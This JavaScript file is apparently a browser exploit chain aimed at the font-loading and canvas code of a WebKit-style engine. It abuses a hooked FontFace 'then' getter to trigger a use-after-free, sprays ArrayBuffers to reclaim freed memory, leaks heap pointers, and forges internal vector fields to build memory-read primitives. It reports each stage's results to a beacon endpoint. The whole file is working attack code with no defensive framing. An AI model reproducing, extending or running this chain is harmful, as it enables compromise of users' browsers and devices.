function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

function b(tag, data){
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P759-' + encodeURIComponent(tag) +
      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
    x.send(null);
  } catch(e){}
}

var OUT = null;
function log(s){
  if (!OUT) OUT = document.getElementById('out');
  if (OUT) OUT.textContent += s + '\n';
}

function pad4(n){
  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
}

function makeRange(lo, hi){
  if (lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;
var Q11_RECLAIM = 0n, Q12_RECLAIM = 0n, Q13_RECLAIM = 0n;

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO', '');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);
  var face = new FontFace('fl0', 'local(Times)', { unicodeRange: 'U+0041' });
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired) return undefined;
      fired = true;
      if (st){ st.remove(); st.textContent = ''; st = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;
      for (var k = 0; k < 70; k++) abs.push(new ArrayBuffer(192));
      try { document.fonts.check('1em lk0'); } catch(e){}
      document.body.offsetHeight;
      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em fl0, lk0', 'AB');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best = -1, bestNz = 0;
    for (var i = 0; i < abs.length; i++){
      var u = new Uint8Array(abs[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }
    }
    if (best < 0 || bestNz < 4){
      b('LEAK-MISS', 'nz=' + bestNz);
      doLeakRetry(cb);
      return;
    }
    LEAK_BUF = abs[best];
    var v = new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if (!P58){
      b('LEAK-NOPTR', 'nz=' + bestNz);
      doLeakRetry(cb);
      return;
    }
    b('LEAK-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68) + '|slot=' + best + '|nz=' + bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY', '');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);
  var face2 = new FontFace('fl1', 'local(Times)', { unicodeRange: 'U+0044' });
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired2) return undefined;
      fired2 = true;
      if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;
      for (var k = 0; k < 80; k++) abs2.push(new ArrayBuffer(192));
      try { document.fonts.check('1em lk1'); } catch(e){}
      document.body.offsetHeight;
      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em fl1, lk1', 'CD');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best = -1, bestNz = 0;
    for (var i = 0; i < abs2.length; i++){
      var u = new Uint8Array(abs2[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }
    }
    if (best < 0 || bestNz < 4){
      b('LEAK-RETRY-MISS', 'nz=' + bestNz);
      return;
    }
    LEAK_BUF = abs2[best];
    var v = new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if (!P58){
      b('LEAK-RETRY-NOPTR', 'slot=' + best);

    }
    b('LEAK-RETRY-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68) + '|slot=' + best + '|nz=' + bestNz);
    setTimeout(cb, 100);
  }, 400);
}

function extractPtrs(v){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
  P58 = null; P68 = null;
  if (v[11] >= LO && v[11] < HI) P58 = v[11];
  if (v[13] >= LO && v[13] < HI) P68 = v[13];
  if (!P58 || !P68){
    for (var q = 0; q < 24; q++){
      var val = v[q];
      if (val >= LO && val < HI){
        if (!P58) P58 = val;
        else if (!P68 && val !== P58) P68 = val;
      }
    }
  }
  if (!P68) P68 = 0n;
}

/* ---- Step 2: Pristine Reclaim ---- */
function doReclaim(cb){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
  if (!P58 || P58 < LO || P58 >= HI || (P58 & 0xFn) !== 0n){
    b('REC-ABORT', 'invalid-p58=0x' + h16(P58));
    return;
  }

  b('REC-START', 'fill_q12_q6=0x' + h16(P58));

  var stTr = document.createElement('style');
  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stTr);

  FACE_B = new FontFace('trFace', 'local(Helvetica)', { unicodeRange: 'U+0048' });
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var absW = [], firedW = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (firedW) return undefined;
      firedW = true;
      if (stTr){ stTr.remove(); stTr.textContent = ''; stTr = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;

      for (var k = 0; k < 80; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[12] = P58;
        view[6] = P58;
        absW.push(ab);
      }

      try { document.fonts.check('1em trFam'); } catch(e){}
      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em trFace, trFam', 'GH');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best = -1, bestNz = 0;
    for (var i = 0; i < absW.length; i++){
      var u = new Uint8Array(absW[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }
    }
    if (best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BEST_K = best;
    BUF_B = absW[best];
    VIEW_B = new BigUint64Array(BUF_B);
    Q11_RECLAIM = VIEW_B[11];
    Q12_RECLAIM = VIEW_B[12];
    Q13_RECLAIM = VIEW_B[13];

    var dump0_11 = [], dump12_23 = [];
    for (var q = 0; q < 12; q++) dump0_11.push('q' + q + '=0x' + h16(VIEW_B[q]));
    for (var q = 12; q < 24; q++) dump12_23.push('q' + q + '=0x' + h16(VIEW_B[q]));

    b('RECLAIM-OK', 'baseK=' + best);
    b('DUMP-Q0-Q11', dump0_11.join(';'));
    b('DUMP-Q12-Q23', dump12_23.join(';'));
    log('Pristine Reclaim OK at slot ' + best);

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Post-Grooming ---- */
function doPostGroom(){
  POST_GROOM = [];
  for (var i = 0; i < 120; i++){
    var ab = new ArrayBuffer(192);
    var v = new BigUint64Array(ab);
    v[0] = 0xCAFEFACE00000000n | BigInt(i);
    v[1] = 0x0000000000000001n;
    v[23] = 0xCAFEFACE000000FFn | (BigInt(i) << 8n);
    POST_GROOM.push(ab);
  }
  log('Post-groomed 120 buffers with sentinel 0xCAFEFACE...');
}

/* ---- Phase A: Slab Mapping & Invariant Verification ---- */
function phaseA_slabMapping(cb){
  var deltaP58 = Q11_RECLAIM - P58;
  var slotsP58 = Number(deltaP58) / 192;
  var slabChunkMask = ~0x3FFFn;
  var slabBase = Q11_RECLAIM & slabChunkMask;
  var slotP58 = Number(P58 - slabBase) / 192;
  var slotQ11 = Number(Q11_RECLAIM - slabBase) / 192;
  var estSelfAddr = slabBase + (BigInt(BEST_K) * 192n);

  var rep = 'baseK=' + BEST_K + '|deltaP58=0x' + deltaP58.toString(16) +
            '|slotsP58=' + slotsP58.toFixed(2) + '|slabBase=0x' + h16(slabBase) +
            '|slotP58=' + slotP58.toFixed(2) + '|slotQ11=' + slotQ11.toFixed(2) +
            '|estSelfAddr=0x' + h16(estSelfAddr);
  b('A-SLAB-MAPPING', rep);
  log('Phase A Slab Mapping: ' + rep);

  setTimeout(cb, 50);
}

/* ---- Phase B: Canvas LineDash <-> ArrayBuffer Cross-Reclaim ---- */
function phaseB_canvasCrossReclaim(cb){
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    document.body.appendChild(canvas);

    var inner = null, outer = null;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function(){
        inner = canvas.getContext('2d');
        return false;
      },
      enumerable: true
    });

    outer = canvas.getContext('2d', opts);

    if (!inner || !outer || inner === outer){
      b('B-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
      setTimeout(cb, 50);
      return;
    }

    var sprayCtx = [];
    for (var i = 0; i < 80; i++){
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      var ctx = c.getContext('2d');
      if (ctx){
        ctx.lineWidth = 1000 + i;
        sprayCtx.push(ctx);
      }
    }

    inner.lineWidth = 31337.5;
    var aliasIdx = -1;
    for (var j = 0; j < sprayCtx.length; j++){
      if (Math.abs(sprayCtx[j].lineWidth - 31337.5) < 0.01){
        aliasIdx = j;
        break;
      }
    }

    if (aliasIdx < 0){
      b('B-ALIAS-MISS', 'lineWidth-scan-failed');
      setTimeout(cb, 50);
      return;
    }

    var alias = sprayCtx[aliasIdx];

    /* B1: Allocate 24-double (192B) Vector with unique recognizable values */
    var arr24 = [];
    for (var d = 0; d < 24; d++) arr24.push(500.0 + d);
    inner.setLineDash(arr24);

    var readB1 = alias.getLineDash();
    var b1_ok = (readB1 && readB1.length === 24 && Math.abs(readB1[0] - 500.0) < 0.01);

    /* B2: Free lineDash buffer and spray tagged ArrayBuffers (192B) */
    // Free the 192-byte lineDash buffer back to bmalloc freelist
    inner.setLineDash([0.0, 0.0]);

    // Spray 60 ArrayBuffer(192) tagged with Float64 canary 750.0 (0x4087700000000000)
    var sprayCanaryAB = [];
    var canaryValFloat = 750.125;
    for (var k = 0; k < 60; k++){
      var ab = new ArrayBuffer(192);
      var fv = new Float64Array(ab);
      fv[0] = canaryValFloat + k;
      fv[1] = 999.0;
      fv[23] = 888.0;
      sprayCanaryAB.push(ab);
    }

    /* B3: Test Cross-Reclaim Detection */
    // Re-read lineDash: if stale pointer was kept, or if realloc reclaims
    var postRead = inner.getLineDash();
    var hitSprayIdx = -1;
    if (postRead && postRead.length > 0){
      for (var s = 0; s < 60; s++){
        if (Math.abs(postRead[0] - (canaryValFloat + s)) < 0.001){
          hitSprayIdx = s;
          break;
        }
      }
    }

    // Now test B4: 96-double (768B) size class expansion
    var arr96 = [];
    for (var m = 0; m < 96; m++) arr96.push(4000.0 + m);
    alias.setLineDash(arr96);
    var read96 = inner.getLineDash();
    var b4_768b = (read96 && read96.length === 96 && Math.abs(read96[0] - 4000.0) < 0.01);

    var rep = 'aliasIdx=' + aliasIdx + '|b1_192b=' + b1_ok +
              '|hitSprayIdx=' + hitSprayIdx + '|b4_768b=' + b4_768b;
    b('B-CROSS-RECLAIM', rep);
    log('Phase B Cross-Reclaim Results: ' + rep);
  } catch(e){
    b('B-CROSS-ERR', e.message);
    log('Phase B Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase C: CSSFontFace m_ranges Vector Injection (q4/q5) ---- */
function phaseC_mrangesInjection(cb){
  try {
    if (!VIEW_B || !FACE_B){
      b('C-SKIP', 'no-view-or-face');
      setTimeout(cb, 50);
      return;
    }

    /* Record baseline values at q4 and q5 */
    var origQ4 = VIEW_B[4]; // m_ranges.m_buffer
    var origQ5 = VIEW_B[5]; // m_ranges.m_capacity << 32 | m_size
    var dumpQ4_Q5 = 'origQ4=0x' + h16(origQ4) + '|origQ5=0x' + h16(origQ5);
    log('Phase C m_ranges baseline: ' + dumpQ4_Q5);

    /* Craft a test UnicodeRange in VIEW_B[0]:
     * struct UnicodeRange { uint32_t from; uint32_t to; };
     * Low 32 bits = from = 0x0041 ('A')
     * High 32 bits = to = 0x0048 ('H')
     * 64-bit value = (0x0048 << 32) | 0x0041
     */
    var rangeVal = (0x00000048n << 32n) | 0x00000041n;
    var origQ0 = VIEW_B[0];
    VIEW_B[0] = rangeVal;

    /* Point m_buffer (q4) to VIEW_B[0] address:
     * estSelfAddr computed in Phase A is slabBase + (BEST_K * 192)
     */
    var slabChunkMask = ~0x3FFFn;
    var slabBase = Q11_RECLAIM & slabChunkMask;
    var targetBufAddr = slabBase + (BigInt(BEST_K) * 192n);

    // Set q4 = targetBufAddr (m_buffer), q5 = capacity 1, size 1
    VIEW_B[4] = targetBufAddr;
    VIEW_B[5] = (1n << 32n) | 1n; // capacity=1, size=1

    // Test fonts.check across range boundary:
    // 'A' (0x41, IN), 'D' (0x44, IN), 'H' (0x48, IN), 'I' (0x49, OUT), 'Z' (0x5A, OUT), '!' (0x21, OUT)
    var chA = document.fonts.check('1em trFace, trFam', 'A');
    var chD = document.fonts.check('1em trFace, trFam', 'D');
    var chH = document.fonts.check('1em trFace, trFam', 'H');
    var chI = document.fonts.check('1em trFace, trFam', 'I');
    var chZ = document.fonts.check('1em trFace, trFam', 'Z');
    var chEx = document.fonts.check('1em trFace, trFam', '!');

    var repInjected = 'A=' + chA + '|D=' + chD + '|H=' + chH + '|I=' + chI + '|Z=' + chZ + '|!=' + chEx;
    b('C-MRANGES-INJECTED', 'target=0x' + h16(targetBufAddr) + '|' + repInjected);
    log('Phase C Injected Check: ' + repInjected);

    /* Strictly restore q0, q4, q5 to ensure absolute engine stability */
    VIEW_B[0] = origQ0;
    VIEW_B[4] = origQ4;
    VIEW_B[5] = origQ5;

    var chRestored = document.fonts.check('1em trFace, trFam', 'A');
    b('C-MRANGES-RESTORED', 'restoredA=' + chRestored);
    log('Phase C Restored OK: A=' + chRestored);
  } catch(e){
    // Ensure restoration even on error
    if (VIEW_B){
      VIEW_B[4] = 0n;
      VIEW_B[5] = 0n;
    }
    b('C-MRANGES-ERR', e.message);
    log('Phase C Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase D: Multi-Pointer Boolean Oracle Resolution ---- */
function phaseD_oracleTrioReconstruction(cb){
  try {
    ACT_FACE = new FontFace('actFam', 'url(/hang.php?nocache=' + Date.now() + ')', { unicodeRange: 'U+0000-00FF' });
    document.fonts.add(ACT_FACE);
    ACT_FACE.load().catch(function(){});

    function resolveByte(targetByte){
      var low = 0x00, high = 0xFF;
      var steps = 0;
      while (low < high && steps < 10){
        steps++;
        var mid = Math.floor((low + high) / 2);
        ACT_FACE.unicodeRange = makeRange(low, mid);
        var chk = document.fonts.check('1em actFam', String.fromCharCode(targetByte));
        var isLower = (chk === false);
        if (isLower) high = mid;
        else low = mid + 1;
      }
      return low;
    }

    function decode64(ptrVal){
      if (!ptrVal) return 0n;
      var raw = [];
      var tmp = ptrVal;
      for (var i = 0; i < 8; i++){
        raw.push(Number(tmp & 0xFFn));
        tmp = tmp >> 8n;
      }
      var res = 0n;
      for (var j = 0; j < 8; j++){
        var bDec = resolveByte(raw[j]);
        res |= (BigInt(bDec) << (BigInt(j) * 8n));
      }
      return res;
    }

    var decP58 = decode64(P58);
    var decQ11 = decode64(Q11_RECLAIM);
    var decQ13 = decode64(Q13_RECLAIM);

    var matchP58 = (decP58 === P58);
    var matchQ11 = (decQ11 === Q11_RECLAIM);
    var matchQ13 = (decQ13 === Q13_RECLAIM);
    var allMatch = matchP58 && matchQ11 && matchQ13;

    var rep = 'all=' + allMatch + '|m58=' + matchP58 + '|m11=' + matchQ11 + '|m13=' + matchQ13 +
              '|p58=0x' + h16(decP58) + '|q11=0x' + h16(decQ11) + '|q13=0x' + h16(decQ13);
    b('D-ORACLE-TRIO-MATCH', rep);
    log('Phase D Multi-Pointer Oracle: ' + rep);
  } catch(e){
    b('D-ORACLE-ERR', e.message);
    log('Phase D Oracle error: ' + e.message);
  }

  setTimeout(cb, 50);
}
